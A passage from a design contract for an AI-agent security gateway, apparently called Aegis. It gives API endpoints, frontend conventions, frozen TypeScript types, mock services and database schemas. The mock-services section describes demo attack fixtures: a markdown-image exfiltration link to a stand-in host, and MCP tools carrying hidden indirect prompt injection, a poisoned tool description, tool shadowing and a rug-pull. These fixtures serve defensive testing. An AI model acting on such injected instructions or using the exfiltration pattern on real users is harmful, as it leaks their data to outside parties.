| `POST /api/approvals/simulate` | approvals-engine | `ApprovalSimulateRequest` → `ApprovalRoute` | "who would approve this?" calculator |
| `GET /api/policy` | policy-engine | → `PolicyResponse` | |
| `GET /api/policy/schema` | policy-engine | → JSON Schema of `PolicyDoc` | Monaco validation |
| `POST /api/policy/validate` | policy-engine | `{yaml}` → `ValidationReport` | runs self-test; never applies |
| `POST /api/policy/diff` | policy-engine | `{yaml}` → `PolicyDiffResponse` | `required_role` from `rt.approvals.route` |
| `POST /api/policy/apply` | policy-engine | `{yaml, base_version, reason?}` → `ApplyResult` | `propose()`; 409 if `base_version` stale |
| `GET /api/policy/history` | policy-engine | → `{items: PolicyVersionInfo[]}` | |
| `GET /api/policy/versions/{v}` | policy-engine | → `{version, yaml}` | |
| `POST /api/policy/rollback` | policy-engine | `{version, reason?}` → `ApplyResult` | governed like apply |
| `GET /api/controls` | policy-engine | → `{items: ControlView[]}` | registry ∪ policy; `owner` from §4.4 |
| `GET /api/coverage` | policy-engine | → `CoverageResponse` | from `owasp` fields; disabled controls show `disabled` |
| `GET /api/feed/status` | threat-feed | → `FeedStatus` | |
| `GET /api/feed/signatures` | threat-feed | → `{items: FeedSignatureView[]}` | |
| `POST /api/feed/refresh` | threat-feed | `{}` → `FeedStatus` | **admin** |
| `GET /api/mcp/servers` | mcp-proxy | → `{items: McpServerView[]}` | |
| `POST /api/mcp/servers/{server}/tools/{tool}/approve` | mcp-proxy | `{comment?}` → `McpToolView` | **admin**; re-pins changed tool |
| `POST /api/mcp/servers/{server}/tools/{tool}/quarantine` | mcp-proxy | `{reason?}` → `McpToolView` | **admin** |
| `POST /api/playground` | core-gateway | `PlaygroundRequest` → `PlaygroundResponse` | identity = the viewer member, or the seeded agent named in `agent_id` (impersonation for demos); session `ses_playground_<viewer>`; `send:false` = evaluate only; default model `mock-echo` (remote) or `aegis-judge` (local) |
| `GET /api/semantic/status` | semantic-models | → `PerfResponse["semantic"]` shape | |
| `GET /api/redaction/entities` | redaction-engine | → `{items: [{entity, data_class, category, detectors: string[]}]}` | |

**Frontend mock fallback (mandatory).** `web/src/api/client.ts` (dashboard-shell) exposes `api.get<T>(path, mock?)`, `api.post<T>(path, body, mock?)`, `api.patch`, `api.download`. When the request fails with **404 / 405 / 501 / network error** and a `mock` factory was passed, it returns the mock and flags the result `isMock` (pages show a small "demo data" `MockBadge`). `?mock=1` in the URL or `VITE_AEGIS_MOCK=1` forces mocks for UI development. Never use mocks to hide 4xx policy results (403/402/409 are real answers). SSE: if `/api/events` cannot connect, the shell retries with backoff and shows "offline"; synthetic events are emitted **only** when mocks are forced. Each page owner keeps its mock factories in its own `web/src/mocks/<area>/`, typed with §5.5 types.

**Shared shell API for pages** (dashboard-shell delivers these first; names and props are binding):
- `@/api/client`: `api`, `ApiResult<T> = {data: T; isMock: boolean}`.
- `@/api/hooks`: `useApi<T>(path: string | null, opts?: {mock?: () => T; refreshMs?: number; refreshOn?: SseEventName[]}) → {data, error, loading, isMock, refresh}`; `useEvents(names: SseEventName[], handler: (name, data) => void)`; `useLiveDecisions(limit = 200) → {items: DecisionSummary[], connected: boolean}`; `useViewAs() → {member: Member | null, role: ViewRole, members: Member[], setViewAs(id: string): void}`; `usePendingApprovals() → number`.
- `@/components/shell`: `PageHeader({title, subtitle?, icon?, actions?})`, `Panel({title?, description?, actions?, className?, children})`, `KpiTile({label, value, delta?, hint?, icon?, tone?: 'neutral'|'good'|'warn'|'bad', sparkline?: number[]})`, `ActionBadge({action, size?})`, `RoleBadge({role})`, `DestBadge({dest})`, `IdentityChip({identity})`, `StatusDot({status: 'ok'|'warn'|'error'|'off', pulse?})`, `MockBadge()`, `EmptyState({icon?, title, hint?})`, `JsonView({value, collapsed?})`, `TimeAgo({ts})`, `RoleGate({min: ViewRole, children, fallback?})`.
- `@/components/charts`: `AreaTimeseries`, `BarList`, `Gauge({value, max, label})`, `Sparkline` (Recharts wrappers, themed).
- `@/lib/format`: `fmtUsd`, `fmtNum`, `fmtPct`, `fmtMs`, `fmtTime`, `fmtAgo`; `@/lib/utils`: `cn`; `@/lib/colors`: `ACTION_COLORS`, `ROLE_COLORS`, `CHART_PALETTE`.
- `@/components/ui/*`: shadcn primitives (button, card, badge, table, tabs, dialog, sheet, dropdown-menu, select, input, textarea, label, switch, slider, tooltip, popover, command, separator, scroll-area, skeleton, avatar, progress, alert, toggle-group); toasts via `sonner`'s `toast`.
- Look & feel: dark by default (slate/zinc base, glassy panels, subtle grid/glow), Inter + JetBrains Mono (`@fontsource-variable/*`, offline), framer-motion for list/feed entry animations, numbers in tabular-nums. Monaco must be loaded from the bundled `monaco-editor` package (`loader.config({ monaco })`), never from a CDN (venue Wi-Fi).

### 5.5 `web/src/api/types.ts` (FROZEN)

```ts
// Aegis dashboard API types. FROZEN: materialized verbatim from docs/CONTRACTS.md section 5.5.
// Mirrors the backend JSON exactly (snake_case, ISO-8601 UTC strings for datetimes).
// Do not edit; request changes in your report. Page-local view types belong next to the page.

export type ISODate = string;
export type Action = 'allow' | 'log' | 'redact' | 'require_approval' | 'block';
export type Kind = 'model_call' | 'tool_call' | 'mcp' | 'egress' | 'a2a' | 'config_change';
export type Direction = 'in' | 'out';
export type DestClass = 'local' | 'remote' | 'third_party';
export type Role = 'owner' | 'admin' | 'member' | 'agent';
export type Severity = 'info' | 'low' | 'medium' | 'high' | 'critical';
export type DataClass = 'PUBLIC' | 'INTERNAL' | 'CONFIDENTIAL' | 'RESTRICTED' | 'SECRET';
export type Mode = 'enforce' | 'monitor' | 'off';
export type Surface =
  | 'prompt.user' | 'model.request' | 'model.response' | 'model.admin'
  | 'tool.input' | 'tool.output' | 'artifact.file'
  | 'mcp.init' | 'mcp.list' | 'mcp.call' | 'mcp.result'
  | 'egress.request' | 'egress.response'
  | 'a2a.message' | 'a2a.result'
  | 'config.change';
export type Source =
  | 'proxy' | 'mcp' | 'hook' | 'guard' | 'egress' | 'playground' | 'dashboard' | 'selftest' | 'test';
export type ApproverLevel = 'auto' | 'self' | 'admin' | 'owner' | 'deny';
export type ApprovalKind = 'action' | 'config_change' | 'budget_raise' | 'mcp_pin';
export type ApprovalStatus = 'pending' | 'approved' | 'denied' | 'expired' | 'cancelled';
export type BudgetDimension = 'usd' | 'tokens' | 'compute_s' | 'requests' | 'tool_calls' | 'spend_usd';
export type BudgetWindow = 'hour' | 'day' | 'week' | 'month' | 'session' | 'total';
export type BudgetState = 'ok' | 'soft' | 'hard' | 'killed';

export const ACTION_ORDER: Action[] = ['allow', 'log', 'redact', 'require_approval', 'block'];
export const ROLE_RANK: Record<Role, number> = { agent: 0, member: 1, admin: 2, owner: 3 };

// ------------------------------------------------------------------ core
export interface Identity {
  org_id: string;
  team_id: string | null;
  member_id: string | null;
  agent_id: string | null;
  role: Role;
  display_name?: string | null;
  authenticated?: boolean;
}

export interface Destination {
  name: string;
  dest_class: DestClass;
  provider?: string | null;
  host?: string | null;
  url?: string | null;
}

export interface TextSegment {
  path: string;
  text: string;
  role: string;
  trusted: boolean;
  redactable: boolean;
}

export interface Finding {
  control_id: string;
  detector: string;
  category: string;
  entity?: string | null;
  data_class?: DataClass | null;
  severity: Severity;
  score: number;
  segment_index?: number | null;
  start?: number | null;
  end?: number | null;
  excerpt?: string | null;
  replacement?: string | null;
  meta?: Record<string, unknown>;
}

export interface Mutation {
  target: 'body' | 'header' | 'route';
  op: 'set' | 'remove';
  path: string;
  value?: unknown;
  reason?: string | null;
}

export interface Decision {
  action: Action;
  control_id: string;
  reason: string;
  score: number | null;
  threshold: number | null;
  approval_id: string | null;
  mode: 'enforce' | 'monitor';
  severity: Severity;
  findings: Finding[];
  mutations: Mutation[];
  http_status?: number | null;
  error_type?: string | null;
  degraded: boolean;
  latency_ms: number;
  owasp: string[];
  meta?: Record<string, unknown>;
}

export interface Redaction {
  segment_index: number;
  path: string;
  start: number;
  end: number;
  entity: string;
  data_class: DataClass | null;
  placeholder: string;
  control_id: string;
  reversible: boolean;
}

export interface Usage {
  input_tokens: number;
  output_tokens: number;
  cache_read_tokens: number;
  cache_write_tokens: number;
  compute_s: number;
  requests: number;
  tool_calls: number;
  cost_usd: number;
  spend_usd: number;
  estimated: boolean;
}

export interface ControlHit {
  control_id: string;
  action: Action;
  mode: 'enforce' | 'monitor';
  score: number | null;
  latency_ms: number;
  degraded: boolean;
}

/** SSE `decision` payload and GET /api/decisions item. */
export interface DecisionSummary {
  id: string;
  ts: ISODate;
  request_id: string;
  action: Action;
  kind: Kind;
  surface: Surface;
  direction: Direction;
  destination: Destination;
  model: string | null;
  tool_name: string | null;
  action_type: string | null;
  amount_usd: number | null;
  identity: Identity;
  session_id: string;
  source: Source;
  control_id: string | null;
  reason: string;
  score: number | null;
  threshold: number | null;
  controls: ControlHit[];
  redaction_count: number;
  entities: string[];
  approval_id: string | null;
  latency_ms: number;
  upstream_ms: number | null;
  policy_version: number;
  feed_serial: number | null;
  degraded: boolean;
  cost_usd: number | null;
  tokens: number | null;
  preview: string;
  dry_run: boolean;
}

export interface WireView {
  decision_id: string;
  original: TextSegment[];
  outbound: TextSegment[];
  response_raw: string | null;
  response_local: string | null;
  upstream_request_preview: Record<string, unknown> | null;
}

/** GET /api/decisions/{id} */
export interface DecisionDetail extends DecisionSummary {
  decisions: Decision[];
  redactions: Redaction[];
  mutations: Mutation[];
  usage: Usage | null;
  wire: WireView | null;
  audit_seq: number | null;
  audit_hash: string | null;
}

export interface Verdict {
  id: string;
  request_id: string;
  interaction_id: string;
  action: Action;
  primary: Decision | null;
  decisions: Decision[];
  segments: TextSegment[];
  redactions: Redaction[];
  mutations: Mutation[];
  approval: ApprovalRequest | null;
  policy_version: number;
  feed_serial: number | null;
  latency_ms: number;
  degraded: boolean;
  dry_run: boolean;
  ts: ISODate;
}

export interface Page<T> {
  items: T[];
  next_cursor?: string | null;
}

/** Standard error envelope for every non-model endpoint. */
export interface ApiError {
  error: {
    type: string;
    message: string;
    control_id?: string | null;
    decision_id?: string | null;
    approval_id?: string | null;
    required_role?: ApproverLevel | null;
    expires_at?: ISODate | null;
    scope?: string | null;
    retry_after_s?: number | null;
  };
}

// ------------------------------------------------------------------ stats & perf
export interface StatsKpis {
  requests: number;
  allowed: number;
  logged: number;
  redacted: number;
  blocked: number;
  approvals_pending: number;
  approvals_decided: number;
  spend_usd: number;
  spend_today_usd: number;
  org_budget_used_pct: number;
  tokens: number;
  local_compute_s: number;
  cost_avoided_usd: number;
  active_agents: number;
  p50_overhead_ms: number;
  p95_overhead_ms: number;
  degraded: boolean;
}

export interface StatsBucket {
  ts: ISODate;
  allow: number;
  log: number;
  redact: number;
  require_approval: number;
  block: number;
  spend_usd: number;
  tokens: number;
}

/** GET /api/stats?window=1h|24h|7d */
export interface StatsResponse {
  window: '1h' | '24h' | '7d';
  generated_at: ISODate;
  kpis: StatsKpis;
  timeseries: StatsBucket[];
  by_control: { control_id: string; family: string; hits: number; blocks: number; redacts: number }[];
  by_category: { category: string; count: number }[];
  by_destination: { dest_class: DestClass; count: number; redactions: number }[];
  by_entity: { entity: string; count: number }[];
  top_agents: { agent_id: string; requests: number; blocks: number; spend_usd: number }[];
}

/** SSE `stats` payload, every ~2 s. */
export interface StatsTick {
  ts: ISODate;
  rps: number;
  decisions_1m: Record<Action, number>;
  spend_today_usd: number;
  approvals_pending: number;
  p50_overhead_ms: number;
  p95_overhead_ms: number;
}

/** GET /api/perf */
export interface PerfResponse {
  generated_at: ISODate;
  overhead_ms: { p50: number; p95: number; p99: number; count: number };
  by_control: { control_id: string; kind: string; p50_ms: number; p95_ms: number; count: number }[];
  upstream_ms: { provider: string; model: string | null; p50: number; p95: number; count: number }[];
  rps_1m: number;
  semantic: {
    mode: string;
    degraded: boolean;
    models: { name: string; backend: string; loaded: boolean; p50_ms: number | null }[];
  };
  bench: Record<string, unknown> | null;
}

// ------------------------------------------------------------------ budgets
export interface BudgetStatus {
  scope: string;
  scope_type: 'org' | 'team' | 'member' | 'agent' | 'session' | 'model' | 'tool';
  dimension: BudgetDimension;
  window: BudgetWindow;
  limit: number;
  used: number;
  reserved: number;
  pct: number;
  state: BudgetState;
  resets_at: ISODate | null;
  label: string | null;
}

export interface BudgetScopeView {
  scope: string;
  scope_type: BudgetStatus['scope_type'];
  name: string;
  parent: string | null;
  state: BudgetState;
  limits: BudgetStatus[];
}

export interface KillSwitch {
  global: boolean;
  teams: string[];
  members: string[];
  agents: string[];
  sessions: string[];
}

/** GET /api/budgets */
export interface BudgetsResponse {
  generated_at: ISODate;
  currency: 'USD';
  pricing_version: string;
  scopes: BudgetScopeView[];
  kill_switch: KillSwitch;
}

/** GET /api/budgets/history?scope=&dimension=&window=24h */
export interface BudgetHistoryResponse {
  scope: string;
  dimension: BudgetDimension;
  points: { ts: ISODate; used: number; limit: number }[];
}

/** POST /api/budgets/raise, POST /api/killswitch, POST /api/policy/apply|rollback */
export interface ApplyResult {
  status: 'applied' | 'pending_approval' | 'rejected' | 'conflict' | 'noop';
  version: number | null;
  previous_version: number | null;
  approval: ApprovalRequest | null;
  decision_id: string | null;
  errors: ValidationIssue[];
  changes: PolicyChange[];
  latency_ms: number;
  message: string;
}

// ------------------------------------------------------------------ org
export interface Org { id: string; name: string }
export interface Team {
  id: string;
  org_id: string;
  name: string;
  description?: string | null;
  color?: string | null;
  meta?: Record<string, unknown>;
}

export interface Member {
  id: string;
  org_id: string;
  team_id: string | null;
  name: string;
  email: string | null;
  role: 'owner' | 'admin' | 'member';
  title: string | null;
  avatar_url: string | null;
  active: boolean;
  created_at: ISODate;
  meta: Record<string, unknown>;
  agents?: string[];
}

export interface Agent {
  id: string;
  org_id: string;
  team_id: string | null;
  owner_member_id: string | null;
  name: string;
  kind: 'claude-code' | 'scripted' | 'sdk' | 'mcp-client' | 'other';
  description: string | null;
  profile: string | null;
  allowed_models: string[];
  allowed_tools: string[];
  denied_tools: string[];
  max_destination: DestClass | null;
  active: boolean;
  created_at: ISODate;
  last_seen: ISODate | null;
  meta: Record<string, unknown>;
  status?: 'active' | 'killed' | 'idle';
  spend_today_usd?: number;
}

/** GET /api/org */
export interface OrgResponse {
  org: Org;
  teams: (Team & { member_count: number; agent_count: number })[];
  counts: { members: number; agents: number; teams: number };
}

export interface Permissions {
  can_apply_policy: 'yes' | 'approval' | 'no';
  can_manage_members: boolean;
  can_killswitch: boolean;
  can_export_audit: boolean;
  approver_levels: ApproverLevel[]; // levels this viewer satisfies
}

/** GET /api/whoami */
export interface WhoAmI {
  identity: Identity;
  member: Member | null;
  permissions: Permissions;
}

// ------------------------------------------------------------------ approvals
export interface ApprovalVote {
  member_id: string;
  role: Role;
  decision: 'approve' | 'deny';
  comment: string | null;
  ts: ISODate;
}

export interface ApprovalRequest {
  id: string;
  org_id: string;
  team_id: string | null;
  kind: ApprovalKind;
  action_type: string;
  title: string;
  summary: string | null;
  requester: Identity;
  amount_usd: number | null;
  resource: string | null;
  labels: Record<string, string>;
  payload: Record<string, unknown>;
  fingerprint: string;
  required_role: ApproverLevel;
  two_person: boolean;
  rule_id: string | null;
  votes: ApprovalVote[];
  status: ApprovalStatus;
  created_at: ISODate;
  expires_at: ISODate | null;
  decided_at: ISODate | null;
  decided_by: string[];
  request_id: string | null;
  decision_id: string | null;
  control_id: string | null;
  uses: number;
  max_uses: number;
  execution: Record<string, unknown> | null;
  can_vote?: boolean; // present when fetched by a viewer
  why_not?: string | null;
}

/** GET /api/approvals */
export interface ApprovalsResponse {
  items: ApprovalRequest[];
  counts: Record<ApprovalStatus, number>;
}

export interface ApprovalRuleView {
  id: string;
  set: 'rules' | 'config_rules';
  description: string | null;
  when: string; // human readable condition
  approver: ApproverLevel;
  two_person: boolean;
  ttl_s: number | null;
}

/** GET /api/approvals/rules */
export interface ApprovalRulesResponse {
  rules: ApprovalRuleView[];
  config_rules: ApprovalRuleView[];
  defaults: { ttl_s: number; default_approver: ApproverLevel; default_config_approver: ApproverLevel };
}

/** POST /api/approvals/simulate */
export interface ApprovalSimulateRequest {
  kind: ApprovalKind;
  action_type: string;
  amount_usd?: number | null;
  resource?: string | null;
  requester_member_id?: string | null;
  requester_agent_id?: string | null;
}
export interface ApprovalRoute {
  required_role: ApproverLevel;
  two_person: boolean;
  rule_id: string | null;
  ttl_s: number;
  max_uses: number;
}

// ------------------------------------------------------------------ policy
export interface ValidationIssue {
  path: string;
  line: number | null;
  col: number | null;
  message: string;
  severity: 'error' | 'warning';
}

export interface PolicyChange {
  kind: string; // ChangeKind, e.g. "budget.raise", "control.disable"
  path: string;
  before: unknown;
  after: unknown;
  control_id: string | null;
  scope: string | null;
  dimension: string | null;
  increase_pct: number | null;
  loosening: boolean;
  summary: string;
}

export interface SelfTestResult {
  name: string;
  control: string | null;
  expect: Action;
  got: Action;
  got_control: string | null;
  passed: boolean;
  latency_ms: number;
}

/** POST /api/policy/validate */
export interface ValidationReport {
  valid: boolean;
  errors: ValidationIssue[];
  warnings: ValidationIssue[];
  selftest: SelfTestResult[];
  selftest_passed: boolean;
  changes: PolicyChange[];
  required_role: ApproverLevel | null;
}

/** GET /api/policy */
export interface PolicyResponse {
  version: number;
  yaml: string;
  sha256: string;
  applied_at: ISODate;
  applied_by: string | null;
  source: string;
  profile: string;
  controls_count: number;
}

/** POST /api/policy/diff */
export interface PolicyDiffResponse {
  changes: PolicyChange[];
  unified: string;
  required_role: ApproverLevel | null;
}

export interface PolicyVersionInfo {
  version: number;
  sha256: string;
  applied_at: ISODate;
  applied_by: string | null;
  source: string;
  reason: string | null;
  changes_count: number;
  summary: string;
}

/** GET /api/controls item */
export interface ControlView {
  id: string;
  family: string;
  name: string;
  kind: 'deterministic' | 'semantic' | 'hybrid' | 'stateful';
  owner: string;
  enabled: boolean;
  mode: Mode;
  action: Action;
  threshold: number | null;
  severity: Severity;
  owasp: string[];
  surfaces: Surface[];
  implemented: boolean;
  hits_24h: number;
  blocks_24h: number;
  p95_ms: number | null;
}

/** GET /api/coverage */
export interface CoverageResponse {
  frameworks: {
    id: string; // "OWASP-LLM-2026" | "OWASP-ASI-2026" | "OWASP-MCP-2025"
    name: string;
    items: {
      id: string;
      name: string;
      status: 'covered' | 'partial' | 'uncovered' | 'disabled';
      controls: string[];
    }[];
  }[];
}

// ------------------------------------------------------------------ feed
/** GET /api/feed/status */
export interface FeedStatus {
  feed_id: string;
  url: string | null;
  status: 'ok' | 'stale' | 'rejected' | 'unreachable' | 'disabled' | 'seed';
  serial: number | null;
  version: string | null;
  published: ISODate | null;
  expires: ISODate | null;
  key_id: string | null;
  signatures_total: number;
  signatures_active: number;
  signatures_monitor: number;
  signatures_quarantined: number;
  last_check: ISODate | null;
  last_update: ISODate | null;
  last_error: string | null;
  history: { serial: number; version: string; applied_at: ISODate; added: number; removed: number; modified: number }[];
}

/** GET /api/feed/signatures item */
export interface FeedSignatureView {
  id: string;
  title: string;
  severity: Severity;
  status: 'experimental' | 'test' | 'stable' | 'deprecated' | 'withdrawn' | 'quarantined';
  aliases: string[];
  tags: string[];
  surfaces: Surface[];
  action: Action;
  hits_24h: number;
}

// ------------------------------------------------------------------ audit
export interface AuditEvent {
  schema: 'aegis.audit/1';
  event_id: string;
  seq: number;
  ts: ISODate;
  event_type: string;
  actor: Identity | null;
  request_id: string | null;
  decision_id: string | null;
  action: Action | null;
  control_id: string | null;
  reason: string | null;
  policy_version: number | null;
  feed_serial: number | null;
  data: Record<string, unknown>;
  prev_hash: string;
  hash: string;
  [k: string]: unknown;
}

/** GET /api/audit/verify */
export interface AuditVerifyResult {
  ok: boolean;
  records: number;
  head_hash: string;
  broken_at_seq: number | null;
  files: number;
  checked_at: ISODate;
  message: string;
}

// ------------------------------------------------------------------ playground
/** POST /api/playground */
export interface PlaygroundRequest {
  text: string;
  kind?: Kind;
  surface?: Surface;
  destination?: DestClass | string; // dest class or provider name ("ollama", "anthropic", "mock")
  model?: string | null;
  agent_id?: string | null;
  tool_name?: string | null;
  tool_args?: Record<string, unknown> | null;
  send?: boolean; // actually call the model when allowed
}

export interface PlaygroundResponse {
  decision_id: string;
  verdict: Verdict;
  original: string;
  outbound: string;
  redactions: Redaction[];
  response: { raw: string; local: string; model: string; provider: string } | null;
  timings: { total_ms: number; controls: { control_id: string; ms: number }[] };
}

// ------------------------------------------------------------------ MCP
export interface McpToolView {
  name: string;
  description_preview: string;
  hash: string;
  status: 'approved' | 'pending' | 'quarantined' | 'changed';
  reasons: string[];
  first_seen: ISODate;
  last_seen: ISODate;
}

/** GET /api/mcp/servers item */
export interface McpServerView {
  name: string;
  transport: 'http' | 'stdio';
  url: string | null;
  destination: DestClass;
  status: 'registered' | 'unknown' | 'blocked' | 'unreachable';
  tools: McpToolView[];
}

// ------------------------------------------------------------------ health
/** GET /healthz */
export interface HealthResponse {
  status: 'ok' | 'degraded';
  version: string;
  uptime_s: number;
  policy_version: number;
  feed_serial: number | null;
  components: Record<string, 'ok' | 'degraded' | 'down' | 'off' | 'stale'>;
}

// ------------------------------------------------------------------ SSE
export interface SseEventMap {
  decision: DecisionSummary;
  'approval.created': ApprovalRequest;
  'approval.updated': ApprovalRequest;
  'budget.updated': { statuses: BudgetStatus[] };
  'budget.threshold': { scope: string; dimension: BudgetDimension; window: BudgetWindow; pct: number; state: BudgetState };
  'policy.applied': { version: number; previous_version: number | null; source: string; actor: Identity | null; changes: PolicyChange[]; latency_ms: number };
  'policy.rejected': { source: string; errors: ValidationIssue[]; kept_version: number };
  'feed.updated': FeedStatus & { added: number; removed: number; modified: number };
  'feed.rejected': { reason: string; serial_attempted: number | null; kept_serial: number | null };
  killswitch: { scope: string; active: boolean; actor: Identity | null };
  'mcp.tool': { server: string; tool: string; status: McpToolView['status']; reason: string };
  'org.updated': { member?: Member; agent?: Agent };
  stats: StatsTick;
  system: { level: 'info' | 'warning' | 'error'; message: string; component?: string };
  heartbeat: { ts: ISODate };
}
export type SseEventName = keyof SseEventMap;
```

### 5.6 Side services

**Feed service** (`python -m feed_service`, `:8790`, threat-feed): `GET /feed/latest.json(.sig)`, `GET /feed/bundle/{serial}.json(.sig)`, `GET /feed/pubkey`, `GET /feed/events` (SSE `published {serial}`); authoring: `GET /` (editor UI, judges add/disable signatures), `GET /api/signatures`, `PUT /api/signatures/{id}` (YAML body), `DELETE /api/signatures/{id}` (sets `withdrawn`), `POST /api/publish` (build → run vectors → sign → bump serial), `POST /api/tamper` (demo: corrupt latest bundle without re-signing), `POST /api/reset`. `python -m feed_service keygen` writes `feed_service/state/keys/` and `config/feeds/feed_pubkey.b64`.

**Mocks** (each `python -m mocks.<name> [--port N]`, default ports §6.6; all log to `data/mocks/`):
- `mock_llm` (:8791, demo-mocks-docs): Anthropic `POST /v1/messages` and OpenAI `POST /v1/chat/completions` (JSON + SSE), `GET /v1/models` (models `mock-echo`, `mock-sonnet`). Default reply **echoes** what it received ("Mock model received: …") so placeholders are visible and rehydration is demonstrable. Triggers in the last user message: `[[EMIT_SECRET]]` (fake AWS key split across 3 SSE chunks), `[[EMIT_PII]]`, `[[EMIT_MD_EXFIL]]` (`![x](http://exfil.test/p.png?d=…)`), `[[EMIT_CANARY]]` (`AEGIS-CANARY-7f3a91`), `[[TOOL_USE:<name>:<json>]]`, `[[LONG:<n>]]`, `[[SLOW:<ms>]]`. Usage: `input_tokens = chars/4`, `output_tokens = chars/4`. Inspection: `GET /_mock/requests?limit=`, `DELETE /_mock/requests` (what actually left the gateway).
- `mock_mcp` (:8792, mcp-proxy): Streamable HTTP MCP servers at `/mcp/<name>` (names = policy `mcp.servers`): `acme-db` (`list_tables`, `query(sql)` over a seeded SQLite `data/mocks/acme_db.sqlite` whose tables follow the org-seed `resources` — `customers` (fake names, emails, phones, PESEL, IBAN), `payment_cards`, `trades`, `positions`, `research_notes`, `market_prices`), `acme-crm` (`lookup_customer(name)`, `export_customers()`), `marketpulse` (`list_plans`, `get_quote(ticker)`, `purchase_subscription(vendor, plan, amount_usd)` — plan `mp-pro-monthly` = $50), `payments` (`create_charge(vendor, amount_usd, currency)`), `mailer` (`send_email(to, subject, body)`), `web` (`fetch_url(url)` returning pages with hidden indirect injection), `weather` (`get_weather(city)`, `add(a, b)`), `poisoned` (`add` with an `<IMPORTANT>` description + tag-char payload; `send_email` shadowing), `rugpull` (benign until `POST /_mock/rugpull/flip`). `POST /_mock/reset`.
- `exfil_sink` (:8793, demo-mocks-docs): records any request; `GET /_mock/hits`, `DELETE /_mock/hits` ("nothing reached the attacker" counter).
- `mock_saas` (:8794, demo-mocks-docs): `POST /payments/subscriptions`, `POST /payments/charges`, `GET /crm/contacts`, `POST /paste` (pastebin-like), `GET /_mock/requests`.
- `AEGIS_HOST_MAP` default: `exfil.test=127.0.0.1:8793,paste.test=127.0.0.1:8794,pay.saas.test=127.0.0.1:8794,crm.saas.test=127.0.0.1:8794`.

---

## 6. Storage, events, metrics, environment, ports

### 6.1 SQLite (`data/aegis.db`, WAL)

Each owner creates **its own tables** with `CREATE TABLE IF NOT EXISTS` in its service `start()` using `rt.db()`. Times are ISO-8601 UTC TEXT; `*_json` columns are JSON TEXT. No migrations (`make reset` wipes `data/`). Never store raw PII/secrets (payloads are redacted first).

```sql
-- org-rbac
CREATE TABLE IF NOT EXISTS orgs    (id TEXT PRIMARY KEY, name TEXT NOT NULL, created_at TEXT NOT NULL);
CREATE TABLE IF NOT EXISTS teams   (id TEXT PRIMARY KEY, org_id TEXT NOT NULL, name TEXT NOT NULL, description TEXT, color TEXT,
  meta_json TEXT NOT NULL DEFAULT '{}');
CREATE TABLE IF NOT EXISTS members (id TEXT PRIMARY KEY, org_id TEXT NOT NULL, team_id TEXT, name TEXT NOT NULL, email TEXT,
  role TEXT NOT NULL CHECK (role IN ('owner','admin','member')), title TEXT, avatar_url TEXT, active INTEGER NOT NULL DEFAULT 1,
  created_at TEXT NOT NULL, meta_json TEXT NOT NULL DEFAULT '{}');
CREATE TABLE IF NOT EXISTS agents  (id TEXT PRIMARY KEY, org_id TEXT NOT NULL, team_id TEXT, owner_member_id TEXT, name TEXT NOT NULL,
  kind TEXT NOT NULL, description TEXT, profile TEXT, allowed_models_json TEXT NOT NULL DEFAULT '["*"]',
  allowed_tools_json TEXT NOT NULL DEFAULT '["*"]', denied_tools_json TEXT NOT NULL DEFAULT '[]', max_destination TEXT,
  active INTEGER NOT NULL DEFAULT 1, created_at TEXT NOT NULL, last_seen TEXT, meta_json TEXT NOT NULL DEFAULT '{}');
CREATE TABLE IF NOT EXISTS api_keys (key_id TEXT PRIMARY KEY, principal TEXT NOT NULL, key_hmac TEXT UNIQUE NOT NULL, scopes_json TEXT NOT NULL DEFAULT '[]',
  created_by TEXT, created_at TEXT, expires_at TEXT, revoked_at TEXT);

-- approvals-engine
CREATE TABLE IF NOT EXISTS approvals (id TEXT PRIMARY KEY, org_id TEXT NOT NULL, team_id TEXT, kind TEXT NOT NULL, action_type TEXT NOT NULL,
  status TEXT NOT NULL, title TEXT NOT NULL, summary TEXT, requester_json TEXT NOT NULL, requester_member_id TEXT, requester_agent_id TEXT,
  amount_usd REAL, resource TEXT, labels_json TEXT NOT NULL DEFAULT '{}', payload_json TEXT NOT NULL DEFAULT '{}', fingerprint TEXT NOT NULL,
  required_role TEXT NOT NULL, two_person INTEGER NOT NULL DEFAULT 0, rule_id TEXT, votes_json TEXT NOT NULL DEFAULT '[]',
  decided_by_json TEXT NOT NULL DEFAULT '[]', created_at TEXT NOT NULL, expires_at TEXT, decided_at TEXT, request_id TEXT,
  decision_id TEXT, control_id TEXT, uses INTEGER NOT NULL DEFAULT 0, max_uses INTEGER NOT NULL DEFAULT 1, execution_json TEXT);
CREATE INDEX IF NOT EXISTS ix_approvals_status ON approvals(status, created_at);
CREATE INDEX IF NOT EXISTS ix_approvals_fp     ON approvals(fingerprint, status);

-- budgets-ledger (reservations live in memory only)
CREATE TABLE IF NOT EXISTS budget_usage (scope TEXT NOT NULL, window TEXT NOT NULL, window_start TEXT NOT NULL, dimension TEXT NOT NULL,
  used REAL NOT NULL DEFAULT 0, updated_at TEXT NOT NULL, PRIMARY KEY (scope, window, window_start, dimension));
CREATE TABLE IF NOT EXISTS budget_samples (ts TEXT NOT NULL, scope TEXT NOT NULL, dimension TEXT NOT NULL, window TEXT NOT NULL,
  used REAL NOT NULL, limit_value REAL);                  -- sampled <= 1 per 5 s per scope, for burn-down charts

-- policy-engine
CREATE TABLE IF NOT EXISTS policy_versions (version INTEGER PRIMARY KEY, sha256 TEXT NOT NULL, yaml TEXT NOT NULL, applied_at TEXT NOT NULL,
  applied_by TEXT, source TEXT NOT NULL, reason TEXT, changes_json TEXT NOT NULL DEFAULT '[]', summary TEXT);

-- audit-metrics
CREATE TABLE IF NOT EXISTS audit_index (seq INTEGER PRIMARY KEY, event_id TEXT UNIQUE NOT NULL, ts TEXT NOT NULL, event_type TEXT NOT NULL,
  request_id TEXT, decision_id TEXT, action TEXT, control_id TEXT, actor TEXT, file TEXT NOT NULL, line INTEGER NOT NULL, hash TEXT NOT NULL);
CREATE TABLE IF NOT EXISTS decisions (id TEXT PRIMARY KEY, ts TEXT NOT NULL, request_id TEXT, org_id TEXT, team_id TEXT, member_id TEXT,
  agent_id TEXT, session_id TEXT, source TEXT, kind TEXT, surface TEXT, direction TEXT, dest_name TEXT, dest_class TEXT, model TEXT,
  tool_name TEXT, action_type TEXT, amount_usd REAL, action TEXT NOT NULL, control_id TEXT, reason TEXT, score REAL, latency_ms REAL,
  upstream_ms REAL, cost_usd REAL, tokens INTEGER, redaction_count INTEGER NOT NULL DEFAULT 0, entities_json TEXT NOT NULL DEFAULT '[]',
  policy_version INTEGER, feed_serial INTEGER, degraded INTEGER NOT NULL DEFAULT 0, dry_run INTEGER NOT NULL DEFAULT 0,
